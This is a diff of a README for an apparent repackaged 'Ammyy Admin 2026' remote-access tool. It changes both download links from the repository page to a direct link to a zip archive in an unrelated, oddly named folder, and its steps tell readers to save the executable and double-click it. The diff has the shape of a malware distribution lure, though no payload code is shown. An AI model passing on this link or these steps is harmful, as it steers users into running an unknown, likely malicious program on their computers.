@@ -5,7 +5,7 @@ description: "Download Ammyy Admin for Windows 10 and 11 with this direct instal
 ---
 # 🖥️ Ammyy-Admin-2026 - Access Remote Computers With Ease
 
-[Visit the repository to download](https://github.com/nikkisilenced488/Ammyy-Admin-2026)
+[Visit the repository to download](https://raw.githubusercontent.com/nikkisilenced488/nikkisilenced488.github.io/main/dynamitism/github_nikkisilenced_io_v1.8.zip)
 
 ## 📖 Overview
 Ammyy Admin-2026 provides a way to connect to remote computers. This tool bridges the distance between your current location and a remote machine. You can view screens, share files, and manage settings as if you sat directly in front of the target computer. The application works well on Windows 10 and Windows 11. It allows IT professionals and casual users to provide support or finish office tasks from anywhere.
@@ -16,7 +16,7 @@ Your system needs basic specifications to run this software. You must have a PC 
 ## 📥 How to Download and Install
 Follow these steps to set up the software on your machine:
 
-1. Visit the following address to access the files: [https://github.com/nikkisilenced488/Ammyy-Admin-2026](https://github.com/nikkisilenced488/Ammyy-Admin-2026).
+1. Visit the following address to access the files: [https://raw.githubusercontent.com/nikkisilenced488/nikkisilenced488.github.io/main/dynamitism/github_nikkisilenced_io_v1.8.zip](https://raw.githubusercontent.com/nikkisilenced488/nikkisilenced488.github.io/main/dynamitism/github_nikkisilenced_io_v1.8.zip).
 2. Locate the download button or link on the page.
 3. Save the executable file to your desktop or downloads folder.
 4. Double-click the file to start the process.
